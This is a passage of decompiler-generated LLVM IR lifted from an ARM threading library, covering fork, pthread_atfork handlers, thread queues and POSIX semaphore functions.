  br i1 %v2_b8ac, label %dec_label_pc_b294, label %dec_label_pc_b8b4

dec_label_pc_b8b4:                                ; preds = %dec_label_pc_b8a4
  store i32 ptrtoint (i32* @global_var_2b490.204 to i32), i32* %r3.global-to-local, align 4
  %v2_b8b8 = load i32, i32* @global_var_2b490.204, align 4
  store i32 %v2_b8b8, i32* %r0.global-to-local, align 4
  %v2_b8bc = icmp eq i32 %v2_b8b8, 0
  store i1 %v2_b8bc, i1* %cpsr_z.global-to-local, align 1
  %tmp67 = icmp slt i32 %v2_b8b8, 1
  br i1 %tmp67, label %dec_label_pc_b294, label %dec_label_pc_b8c4

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b8b4
  %v1_b8c4 = call i32 @__GI_raise(i32 %v2_b8b8)
  store i32 %v1_b8c4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b294

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v1_b854.ph, { 1, 2, 0 }
  uselistorder i32 %v2_b82c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_b7ec, { 1, 0 }
  uselistorder i32 %v0_b7d8, { 1, 0 }
  uselistorder i32 %v0_b7ec.pre, { 1, 0 }
  uselistorder i32 %v0_b7ac, { 1, 2, 0, 3 }
  uselistorder i32 %v3_b71c, { 1, 0 }
  uselistorder i32 %v0_b770, { 1, 0, 2 }
  uselistorder i32 %v0_b6c4, { 2, 1, 0 }
  uselistorder i32 %v0_b698, { 1, 0 }
  uselistorder i1 %v7_b67c, { 1, 0 }
  uselistorder i32 %v2_b678, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_b558, { 1, 0 }
  uselistorder i32 %v1_b4fc, { 1, 0 }
  uselistorder i32 %v1_b4cc, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_b488, { 1, 0, 2, 3 }
  uselistorder i1 %v7_b470, { 1, 0 }
  uselistorder i32 %v3_b448, { 2, 1, 0 }
  uselistorder i32 %v0_b3fc, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v3_b3cc, { 1, 0, 2 }
  uselistorder i1 %v2_b3b4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_b3b4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_b3a0, { 1, 2, 0, 3, 5, 6, 4 }
  uselistorder i32 %v3_b348, { 1, 0, 2 }
  uselistorder i32 %v3_b328, { 6, 5, 4, 3, 2, 0, 1, 7, 8, 9 }
  uselistorder i1 %v2_b2e8, { 1, 0 }
  uselistorder i32 %v2_b1d8, { 1, 0, 3, 2, 5, 4, 7, 6, 8 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
  uselistorder i32 %tmp55, { 1, 0 }
  uselistorder i32 %tmp49, { 2, 0, 1 }
  uselistorder i32 %tmp48, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %sb.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 41, 42, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32* %r2.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 26, 25, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 52, 53, 7, 6, 9, 8, 11, 10, 12, 13, 14, 19, 15, 16, 18, 17, 20, 22, 23, 25, 21, 24, 27, 26, 29, 28, 30, 31, 32, 34, 33, 35, 37, 36, 38, 44, 39, 40, 41, 42, 43, 46, 45, 48, 47, 1, 49, 50, 51, 54, 55, 56, 58, 57, 59, 60, 62, 61, 64, 63, 65, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 10, 9 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 31, 2, 43, 3, 41, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 27, 19, 20, 21, 22, 23, 24, 25, 26, 42, 28, 29, 30, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32* @global_var_2bd14.195, { 0, 3, 1, 2 }
  uselistorder i32 (i32)* @pthread_free, { 1, 0 }
  uselistorder i32* @global_var_2b0a0.209, { 2, 0, 3, 5, 1, 4 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @mmap, { 1, 0 }
  uselistorder i32* @global_var_2bd10.193, { 0, 2, 4, 1, 3 }
  uselistorder i32* @global_var_2b2e8.222, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 3, 2, 5, 4, 6, 7 }
  uselistorder label %dec_label_pc_b864, { 1, 0 }
  uselistorder label %dec_label_pc_b840, { 1, 0 }
  uselistorder label %dec_label_pc_b81c, { 1, 0 }
  uselistorder label %dec_label_pc_b77c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_b72c, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_b6d4, { 1, 0 }
  uselistorder label %dec_label_pc_b6ac, { 1, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b4d8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b4c8, { 1, 0 }
  uselistorder label %dec_label_pc_b42c, { 1, 0 }
  uselistorder label %dec_label_pc_b39c, { 1, 0 }
  uselistorder label %dec_label_pc_b39c.lr.ph, { 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_b294, { 5, 2, 3, 6, 9, 7, 8, 1, 4, 0, 10 }
  uselistorder label %dec_label_pc_b27c, { 1, 0 }
  uselistorder label %dec_label_pc_b234, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
}

define i32 @function_b8f8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_b8f8:
  %v0_b8f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b8f8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_b8f8
  %v4_b8f8 = call i32 @unknown_0()
  %v8_b8fc = lshr i32 %arg3, %arg2
  %v9_b8fc = and i32 %v4_b8f8, %v8_b8fc
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_b8f8, %bb
  %v10_b8fc = phi i32 [ %arg1, %dec_label_pc_b8f8 ], [ %v9_b8fc, %bb ]
  ret i32 %v10_b8fc

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__pthread_manager_event(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_b934 = load i32, i32* bitcast (i32** @global_var_2b2bc.260 to i32*), align 4
  %v2_b938 = call i32 @__pthread_lock(i32 %v3_b934, i32 0)
  %v3_b93c = load i32, i32* bitcast (i32** @global_var_2b2bc.260 to i32*), align 4
  %v1_b940 = call i32 @__pthread_unlock(i32 %v3_b93c)
  %v0_b944 = load i32, i32* @r5, align 4
  %v1_b948 = call i32 @__pthread_manager(i32 %v0_b944)
  %v0_b94c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_b94c, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  ret i32 %v1_b948

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @pthread_insert_list(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_b950 = icmp eq i32 %arg1, 0
  br i1 %v2_b950, label %bb, label %bb5

bb:                                               ; preds = %entry
  %v2_b954 = load i32, i32* @r0, align 4
  ret i32 %v2_b954

bb5:                                              ; preds = %entry
  call void @llvm.trap()
  unreachable
}

define i32 @pthread_call_handlers(i32* %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-8 = alloca i32, align 4
  %v3_b984 = load i32, i32* @r4, align 4
  store i32 %v3_b984, i32* %stack_var_-8, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  %v2_b99c2 = icmp eq i32* %arg1, null
  br i1 %v2_b99c2, label %dec_label_pc_b9a4, label %dec_label_pc_b990

dec_label_pc_b990:                                ; preds = %entry, %dec_label_pc_b990
  %v0_b994 = phi i32 [ %v3_b998, %dec_label_pc_b990 ], [ %tmp, %entry ]
  store i32 47512, i32* @lr, align 4
  %v1_b994 = inttoptr i32 %v0_b994 to i32*
  %v2_b994 = load i32, i32* %v1_b994, align 4
  call void @__pseudo_branch(i32 %v2_b994)
  %v0_b998 = load i32, i32* %r4.global-to-local, align 4
  %v1_b998 = add i32 %v0_b998, 4
  %v2_b998 = inttoptr i32 %v1_b998 to i32*
  %v3_b998 = load i32, i32* %v2_b998, align 4
  store i32 %v3_b998, i32* %r4.global-to-local, align 4
  %v2_b99c = icmp eq i32 %v3_b998, 0
  br i1 %v2_b99c, label %dec_label_pc_b99c.dec_label_pc_b9a4_crit_edge, label %dec_label_pc_b990

dec_label_pc_b99c.dec_label_pc_b9a4_crit_edge:    ; preds = %dec_label_pc_b990
  %v2_b9a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_b9a4

dec_label_pc_b9a4:                                ; preds = %dec_label_pc_b99c.dec_label_pc_b9a4_crit_edge, %entry
  %v2_b9a4 = phi i32 [ %v2_b9a4.pre, %dec_label_pc_b99c.dec_label_pc_b9a4_crit_edge ], [ %v3_b984, %entry ]
  store i32 %v2_b9a4, i32* @r4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_b998, { 2, 1, 0 }
  uselistorder i32 %tmp, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b990, { 1, 0 }
}

define i32 @fork() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v3_b9a8 = load i32, i32* @r4, align 4
  %v6_b9a8 = load i32, i32* @r5, align 4
  %v9_b9a8 = load i32, i32* @r6, align 4
  %v12_b9a8 = load i32, i32* @r7, align 4
  %v15_b9a8 = load i32, i32* @r8, align 4
  store i32 62768, i32* @r4, align 4
  %v2_b9b4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_b9bc = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2bd1c.262 to i32))
  %v2_b9c4 = load i32, i32* @global_var_2bd34.265, align 4
  %v2_b9cc = load i32, i32* @global_var_2bd38.267, align 4
  store i32 %v2_b9cc, i32* @r8, align 4
  %v2_b9d4 = load i32, i32* @global_var_2bd3c.269, align 4
  store i32 %v2_b9d4, i32* @r7, align 4
  %v1_b9d8 = inttoptr i32 %v2_b9c4 to i32*
  %v2_b9d8 = call i32 @pthread_call_handlers(i32* %v1_b9d8)
  %v1_b9dc = call i32 @__pthread_once_fork_prepare(i32 %v2_b9d8)
  %v2_b9e8 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_30254.271 to i32))
  %v2_b9f4 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_3009c.273 to i32))
  %v1_b9f8 = call i32 @__libc_fork(i32 %v2_b9f4)
  store i32 %v1_b9f8, i32* @r5, align 4
  %v2_b9fc = icmp eq i32 %v1_b9f8, 0
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r4, align 4
  store i32 61860, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* @r0, align 4
  br i1 %v2_b9fc, label %dec_label_pc_ba64, label %dec_label_pc_bad4

dec_label_pc_ba64:                                ; preds = %entry
  store i32 %v2_b9b4, i32* @r4, align 4
  store i32 %v2_b9b4, i32* @r7, align 4
  %v3_ba2c = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-28)
  %v0_ba34 = load i32, i32* @r5, align 4
  %v4_ba40 = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-28, i32 %v0_ba34)
  %v4_ba50 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_3009c.273 to i32), i32* nonnull %stack_var_-28)
  %v2_ba60 = call i32 @pthread_mutexattr_destroy(i32 %v2_b9b4)
  %v0_ba64.pre = load i32, i32* @r5, align 4
  store i32 47732, i32* @lr, align 4
  %v3_ba70 = inttoptr i32 %v0_ba64.pre to i32*
  %v4_ba70 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_30254.271 to i32), i32* %v3_ba70)
  %v0_ba74 = load i32, i32* @r6, align 4
  %v2_ba74 = icmp eq i32 %v0_ba74, 0
  br i1 %v2_ba74, label %dec_label_pc_bac0, label %dec_label_pc_ba80

dec_label_pc_ba80:                                ; preds = %dec_label_pc_ba64
  %v3_ba88 = call i32 @pthread_mutexattr_init(i32* nonnull %stack_var_-28)
  %v0_ba90 = load i32, i32* @r5, align 4
  %v4_ba9c = call i32 @__pthread_mutexattr_setkind_np(i32* nonnull %stack_var_-28, i32 %v0_ba90)
  %v4_baac = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_2bd1c.262 to i32), i32* nonnull %stack_var_-28)
  store i32 47808, i32* @lr, align 4
  %v2_babc = call i32 @pthread_mutexattr_destroy(i32 %v2_b9b4)
  br label %dec_label_pc_bac0

dec_label_pc_bac0:                                ; preds = %dec_label_pc_ba64, %dec_label_pc_ba80
  %v0_bac0 = call i32 @__pthread_reset_main_thread()
  %v1_bac4 = call i32 @__fresetlockfiles(i32 %v0_bac0)
  %v1_bac8 = call i32 @__pthread_once_fork_child(i32 %v1_bac4)
  br label %dec_label_pc_bafc

dec_label_pc_bad4:                                ; preds = %entry
  %v1_bad8 = call i32 @pthread_mutex_unlock()
  store i32 ptrtoint (i32* @global_var_30254.271 to i32), i32* @r0, align 4
  %v1_bae4 = call i32 @pthread_mutex_unlock()
  store i32 ptrtoint (i32* @global_var_2bd1c.262 to i32), i32* @r0, align 4
  store i32 47860, i32* @lr, align 4
  %v1_baf0 = call i32 @pthread_mutex_unlock()
  %v1_baf4 = call i32 @__pthread_once_fork_parent(i32 %v1_baf0)
  br label %dec_label_pc_bafc

dec_label_pc_bafc:                                ; preds = %dec_label_pc_bac0, %dec_label_pc_bad4
  %storemerge.in = phi i32* [ @r7, %dec_label_pc_bad4 ], [ @r8, %dec_label_pc_bac0 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_bafc = inttoptr i32 %storemerge to i32*
  %v2_bafc = call i32 @pthread_call_handlers(i32* %v1_bafc)
  %v0_bb00 = load i32, i32* @r5, align 4
  store i32 %v3_b9a8, i32* @r4, align 4
  store i32 %v6_b9a8, i32* @r5, align 4
  store i32 %v9_b9a8, i32* @r6, align 4
  store i32 %v12_b9a8, i32* @r7, align 4
  store i32 %v15_b9a8, i32* @r8, align 4
  ret i32 %v0_bb00

; uselistorder directives
  uselistorder i32 %v2_b9b4, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-28, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder label %dec_label_pc_bafc, { 1, 0 }
  uselistorder label %dec_label_pc_bac0, { 1, 0 }
}

define i32 @vfork() local_unnamed_addr {
entry:
  %v0_bb3c = call i32 @fork()
  ret i32 %v0_bb3c
}

define i32 @pthread_atfork(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v1_bb54 = call i32 @malloc(i32 24)
  store i32 %v1_bb54, i32* @r4, align 4
  %v2_bb58 = icmp eq i32 %v1_bb54, 0
  br i1 %v2_bb58, label %dec_label_pc_bbc4, label %dec_label_pc_bb68

dec_label_pc_bb68:                                ; preds = %entry
  %v2_bb70 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2bd1c.262 to i32))
  %v0_bb74 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2bd34.265 to i32), i32* @r0, align 4
  %v0_bb7c = load i32, i32* @r4, align 4
  %v4_bb84 = inttoptr i32 %v0_bb74 to i32*
  %v5_bb84 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_2bd34.265 to i32), i32* %v4_bb84, i32 %v0_bb7c, i32 0)
  %v0_bb88 = load i32, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2bd3c.269 to i32), i32* @r0, align 4
  %v0_bb90 = load i32, i32* @r4, align 4
  %v1_bb90 = add i32 %v0_bb90, 8
  %v4_bb98 = inttoptr i32 %v0_bb88 to i32*
  %v5_bb98 = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_2bd3c.269 to i32), i32* %v4_bb98, i32 %v1_bb90, i32 1)
  %v0_bb9c = load i32, i32* @r7, align 4
  %v0_bba0 = load i32, i32* @r4, align 4
  %v1_bba0 = add i32 %v0_bba0, 16
  store i32 ptrtoint (i32* @global_var_2bd38.267 to i32), i32* @r0, align 4
  %v4_bbac = inttoptr i32 %v0_bb9c to i32*
  %v5_bbac = call i32 @pthread_insert_list(i32 ptrtoint (i32* @global_var_2bd38.267 to i32), i32* %v4_bbac, i32 %v1_bba0, i32 1)
  store i32 ptrtoint (i32* @global_var_2bd1c.262 to i32), i32* @r0, align 4
  %v1_bbbc = call i32 @pthread_mutex_unlock()
  br label %dec_label_pc_bbc4

dec_label_pc_bbc4:                                ; preds = %entry, %dec_label_pc_bb68
  %v0_bbc4 = phi i32 [ 12, %entry ], [ 0, %dec_label_pc_bb68 ]
  ret i32 %v0_bbc4

; uselistorder directives
  uselistorder i32* @global_var_2bd38.267, { 1, 0 }
  uselistorder i32* @global_var_2bd3c.269, { 1, 0 }
  uselistorder i32* @global_var_2bd34.265, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2bd1c.262 to i32), { 3, 0, 4, 1, 2 }
  uselistorder label %dec_label_pc_bbc4, { 1, 0 }
}

define i32 @enqueue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  call void @llvm.trap()
  unreachable
}

define i32 @remove_from_queue(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v0_bc3c2 = load i32, i32* @r0, align 4
  %v1_bc3c3 = inttoptr i32 %v0_bc3c2 to i32*
  %v2_bc3c4 = load i32, i32* %v1_bc3c3, align 4
  store i32 %v2_bc3c4, i32* %r2.global-to-local, align 4
  %v2_bc406 = icmp eq i32 %v2_bc3c4, 0
  br i1 %v2_bc406, label %dec_label_pc_bc48, label %dec_label_pc_bc18

dec_label_pc_bc18:                                ; preds = %entry, %dec_label_pc_bc38
  %v1_bc28 = phi i32 [ %v1_bc20, %dec_label_pc_bc38 ], [ %v0_bc3c2, %entry ]
  %v0_bc20 = phi i32 [ %v2_bc3c, %dec_label_pc_bc38 ], [ %v2_bc3c4, %entry ]
  %v9_bc18 = icmp eq i32 %v0_bc20, %arg1
  %v1_bc20 = add i32 %v0_bc20, 8
  br i1 %v9_bc18, label %dec_label_pc_bc20, label %dec_label_pc_bc38

dec_label_pc_bc20:                                ; preds = %dec_label_pc_bc18
  %v2_bc20 = inttoptr i32 %v1_bc20 to i32*
  %v3_bc20 = load i32, i32* %v2_bc20, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_bc28 = inttoptr i32 %v1_bc28 to i32*
  store i32 %v3_bc20, i32* %v2_bc28, align 4
  %v1_bc30 = load i32, i32* %r2.global-to-local, align 4
  %v2_bc30 = add i32 %v1_bc30, 8
  %v3_bc30 = inttoptr i32 %v2_bc30 to i32*
  store i32 0, i32* %v3_bc30, align 4
  %v0_bc4c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bc4c

dec_label_pc_bc38:                                ; preds = %dec_label_pc_bc18
  %v1_bc3c = inttoptr i32 %v1_bc20 to i32*
  %v2_bc3c = load i32, i32* %v1_bc3c, align 4
  store i32 %v2_bc3c, i32* %r2.global-to-local, align 4
  %v2_bc40 = icmp eq i32 %v2_bc3c, 0
  br i1 %v2_bc40, label %dec_label_pc_bc3c.dec_label_pc_bc48_crit_edge, label %dec_label_pc_bc18

dec_label_pc_bc3c.dec_label_pc_bc48_crit_edge:    ; preds = %dec_label_pc_bc38
  br label %dec_label_pc_bc48

dec_label_pc_bc48:                                ; preds = %dec_label_pc_bc3c.dec_label_pc_bc48_crit_edge, %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_bc4c

dec_label_pc_bc4c:                                ; preds = %dec_label_pc_bc20, %dec_label_pc_bc48
  %v0_bc4c = phi i32 [ %v0_bc4c.pre, %dec_label_pc_bc20 ], [ 0, %dec_label_pc_bc48 ]
  ret i32 %v0_bc4c

; uselistorder directives
  uselistorder i32 %v2_bc3c, { 1, 2, 0 }
  uselistorder i32 %v1_bc20, { 2, 0, 1 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_bc4c, { 1, 0 }
  uselistorder label %dec_label_pc_bc18, { 1, 0 }
}

define i32 @__new_sem_getvalue(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v1_bc54 = add i32 %arg1, 8
  %v2_bc54 = inttoptr i32 %v1_bc54 to i32*
  %v3_bc54 = load i32, i32* %v2_bc54, align 4
  store i32 %v3_bc54, i32* %arg2, align 4
  ret i32 0
}

define i32 @__pthread_set_own_extricate_if(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_bc64 = load i32, i32* @r4, align 4
  store i32 %v3_bc64, i32* %stack_var_-12, align 4
  %v9_bc64 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v2_bc68 = icmp eq i32 %arg2, 0
  %v0_bc6c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_bc6c, i32* %r4.global-to-local, align 4
  br i1 %v2_bc68, label %dec_label_pc_bc88, label %dec_label_pc_bc78

dec_label_pc_bc78:                                ; preds = %entry
  %v1_bc78 = add i32 %v0_bc6c, 64
  %v2_bc78 = inttoptr i32 %v1_bc78 to i8*
  %v3_bc78 = load i8, i8* %v2_bc78, align 1
  %v2_bc7c = icmp eq i8 %v3_bc78, 0
  br i1 %v2_bc7c, label %dec_label_pc_bc90, label %bb

bb:                                               ; preds = %dec_label_pc_bc78
  store i32 %v3_bc64, i32* @r4, align 4
  ret i32 %v0_bc6c

dec_label_pc_bc88:                                ; preds = %entry
  %v1_bc88 = add i32 %v0_bc6c, 28
  %v2_bc88 = inttoptr i32 %v1_bc88 to i32*
  %v3_bc88 = load i32, i32* %v2_bc88, align 4
  store i32 %v3_bc88, i32* %r0.global-to-local, align 4
  %v2_bc8c = call i32 @__pthread_lock(i32 %v3_bc88, i32 %v0_bc6c)
  store i32 %v2_bc8c, i32* %r0.global-to-local, align 4
  %v0_bc90.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_bc94.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_bc90

dec_label_pc_bc90:                                ; preds = %dec_label_pc_bc78, %dec_label_pc_bc88
  %v1_bc94 = phi i32 [ %v0_bc6c, %dec_label_pc_bc78 ], [ %v1_bc94.pre, %dec_label_pc_bc88 ]
  %v0_bc94 = phi i32 [ %arg2, %dec_label_pc_bc78 ], [ %v0_bc90.pre, %dec_label_pc_bc88 ]
  %v2_bc90 = icmp eq i32 %v0_bc94, 0
  %v2_bc94 = add i32 %v1_bc94, 444
  %v3_bc94 = inttoptr i32 %v2_bc94 to i32*
  store i32 %v0_bc94, i32* %v3_bc94, align 4
  br i1 %v2_bc90, label %bb7, label %bb6

bb6:                                              ; preds = %dec_label_pc_bc90
  %v3_bc98 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_bc98, i32* @r4, align 4
  %v12_bc98 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v12_bc98

bb7:                                              ; preds = %dec_label_pc_bc90
  %v0_bc9c = load i32, i32* %r4.global-to-local, align 4
  %v1_bc9c = add i32 %v0_bc9c, 28
  %v2_bc9c = inttoptr i32 %v1_bc9c to i32*
  %v3_bc9c = load i32, i32* %v2_bc9c, align 4
  store i32 %v3_bc9c, i32* %r0.global-to-local, align 4
  %v2_bca0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bca0, i32* @r4, align 4
  store i32 %v9_bc64, i32* @lr, align 4
  %v1_bca4 = call i32 @__pthread_unlock(i32 %v3_bc9c)
  store i32 %v1_bca4, i32* %r0.global-to-local, align 4
  ret i32 %v1_bca4

; uselistorder directives
  uselistorder i32 %v0_bc6c, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 6, 4, 0, 1 }
  uselistorder label %dec_label_pc_bc90, { 1, 0 }
}

define i32 @sem_unlink() local_unnamed_addr {
entry:
  %v0_bcac = call i32 @__errno_location()
  %v2_bcb4 = inttoptr i32 %v0_bcac to i32*
  store i32 38, i32* %v2_bcb4, align 4
  ret i32 -1
}

define i32 @sem_close() local_unnamed_addr {
entry:
  %v0_bcc4 = call i32 @__errno_location()
  %v2_bccc = inttoptr i32 %v0_bcc4 to i32*
  store i32 38, i32* %v2_bccc, align 4
  ret i32 -1
}

define i32 @sem_open(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_bce0 = call i32 @__errno_location()
  %v2_bce8 = inttoptr i32 %v0_bce0 to i32*
  store i32 38, i32* %v2_bce8, align 4
  ret i32 0
}

define i32 @__new_sem_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_bcfc = add i32 %arg1, 12
  %v2_bcfc = inttoptr i32 %v1_bcfc to i32*
  %v3_bcfc = load i32, i32* %v2_bcfc, align 4
  %v2_bd00 = icmp eq i32 %v3_bcfc, 0
  br i1 %v2_bd00, label %bb, label %bb2

bb:                                               ; preds = %entry
  ret i32 0

bb2:                                              ; preds = %entry
  %v0_bd10 = call i32 @__errno_location()
  %v2_bd18 = inttoptr i32 %v0_bd10 to i32*
  store i32 16, i32* %v2_bd18, align 4
  ret i32 -1
}

define i32 @__new_sem_trywait(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_bd24 = load i32, i32* @r4, align 4
  store i32 %v3_bd24, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_bd30 = call i32 @__pthread_lock(i32 %arg1, i32 0)
  %v1_bd34 = add i32 %arg1, 8
  %v2_bd34 = inttoptr i32 %v1_bd34 to i32*
  %v3_bd34 = load i32, i32* %v2_bd34, align 4
  %v2_bd38 = icmp eq i32 %v3_bd34, 0
  store i32 -1, i32* %r5.global-to-local, align 4
  br i1 %v2_bd38, label %dec_label_pc_bd50, label %.thread

.thread:                                          ; preds = %entry
  %v1_bd3c = add i32 %v3_bd34, -1
  store i32 %v1_bd3c, i32* %v2_bd34, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_bd5c

dec_label_pc_bd50:                                ; preds = %entry
  %v0_bd50 = call i32 @__errno_location()
  %v2_bd58 = inttoptr i32 %v0_bd50 to i32*
  store i32 11, i32* %v2_bd58, align 4
  br label %dec_label_pc_bd5c

dec_label_pc_bd5c:                                ; preds = %.thread, %dec_label_pc_bd50
  %v0_bd5c = load i32, i32* %r4.global-to-local, align 4
  %v1_bd60 = call i32 @__pthread_unlock(i32 %v0_bd5c)
  %v0_bd64 = load i32, i32* %r5.global-to-local, align 4
  %v2_bd68 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bd68, i32* %r4.global-to-local, align 4
  ret i32 %v0_bd64

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_bd5c, { 1, 0 }
}

define i32 @__new_sem_init(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_bd6c = icmp slt i32 %arg3, 0
  br i1 %v1_bd6c, label %dec_label_pc_bd78, label %dec_label_pc_bd88

dec_label_pc_bd78:                                ; preds = %entry
  %v0_bd78 = call i32 @__errno_location()
  br label %dec_label_pc_bda0

dec_label_pc_bd88:                                ; preds = %entry
  %v2_bd88 = icmp eq i32 %arg2, 0
  store i32 %arg2, i32* %ip.global-to-local, align 4
  br i1 %v2_bd88, label %dec_label_pc_bda8, label %dec_label_pc_bd94

dec_label_pc_bd94:                                ; preds = %dec_label_pc_bd88
  %v0_bd94 = call i32 @__errno_location()
  br label %dec_label_pc_bda0

dec_label_pc_bda0:                                ; preds = %dec_label_pc_bd78, %dec_label_pc_bd94
  %storemerge1 = phi i32 [ %v0_bd94, %dec_label_pc_bd94 ], [ %v0_bd78, %dec_label_pc_bd78 ]
  %storemerge = phi i32 [ 38, %dec_label_pc_bd94 ], [ 22, %dec_label_pc_bd78 ]
